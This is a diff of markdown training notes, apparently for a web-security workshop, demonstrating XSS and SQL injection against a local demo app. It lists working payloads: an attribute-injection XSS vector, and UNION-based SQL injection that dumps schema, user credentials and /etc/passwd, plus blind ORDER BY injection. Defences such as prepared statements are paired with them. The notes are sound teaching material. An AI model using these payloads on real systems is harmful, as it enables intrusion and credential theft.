@@ -32,6 +32,7 @@ Invalid input means:
 ## Input manipulation tools
 - Burp Suite
 - Tamper data FF plugin
+etc.
 
 ## Web Content Injection - typically named XSS
 1. USER enters some data (e.g. username/password)
@@ -53,10 +54,15 @@ Invalid input means:
 http://localhost:8080/search
 
 - When query is entered it is reflected back by server
-- Searching for: `test ' " < > <tag>`
+- How to detect hole? Search for: `test ' " < > <tag>`
 - check 'View source' not 'Inspect' to find broken HTML
 - `" autofocus onfocus="alert(1)"`
 - chrome detects XSS attack vector - what about safari, firefox
+- TODO: what about escaping html, so that detection does not help?
+
+```html
+alert(1) == &#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
+```
 
 #### Wrong Content-Type
 http://localhost:8080/rest/partner
@@ -65,6 +71,7 @@ What if partner can change his name?
 http://localhost:8080/rest/partner?name=abc
 
 #### "I use well-known templating framework and it will do the work"
+
 Spring Boot App + Freemarker
 
 http://freemarker.org/docs/pgui_config_outputformatsautoesc.html
@@ -77,9 +84,9 @@ configuration.setOutputFormat(HTMLOutputFormat.INSTANCE);
 
 ### Javascript injection
 
-? $.getJSON
+//? $.getJSON
 
-x-content-type-options: nosniff
+//x-content-type-options: nosniff
 
 ### URL manipulation
 
@@ -98,34 +105,34 @@ x-content-type-options: nosniff
 
 ### DEMO: SELECT
 http://localhost:8080/sql/search
-- ' OR 1=1
-- ' OR 1=1 #
+- `' OR 1=1`
+- `' OR 1=1 #`
 
 #### How many columns there are?
-- ' UNION SELECT 1 #
-- ' UNION SELECT 1,2 #
+- `' UNION SELECT 1 #`
+- `' UNION SELECT 1,2 #`
 - etc.
 
 #### Useful info
 ```sql
 SELECT DATABASE(), USER(), SERVER()
 ```
-- ' UNION SELECT 1, USER(), 3 #
+`' UNION SELECT 1, USER(), 3 #`
 
 #### Database structure
 E.g. MySQL
 ```sql
 SELECT * FROM INFORMATION_SCHEMA.COLUMNS
 ```
-' UNION SELECT 1, CONCAT(TABLE_SCHEMA,',',TABLE_NAME,',',COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS #
+`' UNION SELECT 1, CONCAT(TABLE_SCHEMA,',',TABLE_NAME,',',COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS #`
 
 #### User table
-' UNION SELECT 1, CONCAT(USERNAME,',',PASSWORD), 3 FROM USERS #
+`' UNION SELECT 1, CONCAT(USERNAME,',',PASSWORD), 3` FROM USERS #
 
 #### Read files
-' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 #
+`' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 #`
 
-#### FIX - Prepared statements
+#### DEFENCE - Prepared statements
 
 ```java
   PreparedStatement updateSales = con.prepareStatement(
@@ -139,9 +146,26 @@ What about searching: `%`
 
 ### DEMO: ORDER BY
 
+```java
+PreparedStatement updateSales = con.prepareStatement(
+          "SELECT * FROM products ORDER BY ?");
+      updateSales.setString(1, orderBy);
+```
 
+?
+
+http://localhost:8080/sql/list?orderBy=price
+
+`IF(1=1,price,name)`
+
+#### DEFENCE
+- Do not use user input in order by
+- E.g. use enum that translates to "good" SQL
 
 ### DEMO: BLIND
 
+`IF(1=1,price,name)` vs `IF(1=2,price,name)`
 
-### DEMO: console
+`IF(EXISTS(SELECT * FROM USERS WHERE USERNAME='admin'),price,name)`
+
+http://localhost:8080/hack
